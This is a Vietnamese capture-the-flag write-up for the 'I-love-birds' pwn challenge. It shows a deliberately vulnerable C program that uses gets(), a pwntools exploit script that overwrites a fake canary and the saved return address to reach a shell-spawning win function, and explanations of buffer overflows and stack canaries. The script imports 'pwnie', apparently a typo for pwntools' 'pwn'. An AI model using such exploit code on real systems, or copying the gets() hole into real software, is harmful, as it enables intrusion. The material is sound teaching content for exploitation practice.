---
title: Pwwn - I-love-birds
---

## Solution

```c
#include <stdio.h>
#include <stdlib.h>

void gadget() {
    asm("push $0x69;pop %rdi");
}


void win(int secret) {
    if (secret == 0xA1B2C3D4) {
        system("/bin/sh");
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    unsigned int canary = 0xDEADBEEF;

    char buf[64];

    puts("I made a canary to stop buffer overflows. Prove me wrong!");
    gets(buf); // Buffer Overflow

    if (canary != 0xDEADBEEF) {
        puts("No stack smashing for you!");
        exit(1);
    }

    return 0;
}
```

Chương trình có một lỗi `Buffer Overflow` ở hàm `gets(buf)`, ta có thể ghi đè lên biến `canary` để qua được kiểm tra và gọi hàm `win()` thông qua việc ghi đè saved RIP của hàm main.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./birds', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
b *0x40125D
c
'''

def start(argv=[]):
    if args.GDB:
        p = process([exe.path] + argv, aslr=False)
        gdb.attach(p, gdbscript=gdbscript)
        pause()
        return p
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv)


# ==================== EXPLOIT ====================
p = start()

canary = 0xDEADBEEF

sl(b'A'*0x48 + b'B'*4 + p32(canary) + p64(0) + p64(0x4011dc))

interactive()
```

## Mở rộng

- Buffer Overflow là một lỗi bảo mật xảy ra khi một chương trình cố gắng ghi dữ liệu vào một vùng bộ nhớ mà không kiểm tra kích thước của dữ liệu đó, dẫn đến việc ghi đè lên các vùng bộ nhớ khác. Trong trường hợp này, hàm `gets(buf)` không kiểm tra kích thước của chuỗi nhập vào, cho phép kẻ tấn công ghi đè lên các biến khác trong stack, bao gồm cả biến `canary` và địa chỉ trả về của hàm.

- Stack Canary là một kỹ thuật bảo mật được sử dụng để phát hiện và ngăn chặn các cuộc tấn công tràn bộ đệm (buffer overflow). Nó hoạt động bằng cách đặt một giá trị đặc biệt (canary) vào vùng bộ nhớ ngay trước địa chỉ trả về của hàm. Nếu giá trị này bị thay đổi, chương trình sẽ nhận ra rằng có một cuộc tấn công đã xảy ra và sẽ dừng thực thi. Ở đây, ta có thể thấy rằng giá trị canary được đặt là `0xDEADBEEF`, và nếu giá trị này bị thay đổi, chương trình sẽ dừng lại và không cho phép thực thi hàm `win()`. Stack Canary sẽ tuỳ vào kiến trúc mà có số byte khác nhau, ví dụ như trên x86-64 sẽ là 8 byte, trong khi trên x86 sẽ là 4 byte. Lưu ý rằng giá trị canary ở challenge này là giá trị tượng trưng, chứ không phải là giá trị canary thực tế. Trên thực tế canary đã được tắt trong lúc compile.

```sh
-----------------
| ...           |
-----------------
| Stack Canary  |
-----------------
| Saved RBP     |
-----------------
| Saved RIP     |
-----------------
```

- Saved RIP (Return Instruction Pointer) là một thanh ghi trong kiến trúc x86-64, nó lưu địa chỉ của lệnh tiếp theo sẽ được thực thi sau khi hàm hiện tại kết thúc. Khi xảy ra tràn bộ đệm, kẻ tấn công có thể ghi đè lên giá trị này để điều khiển luồng thực thi của chương trình, ví dụ như chuyển đến một hàm khác mà kẻ tấn công muốn thực thi.
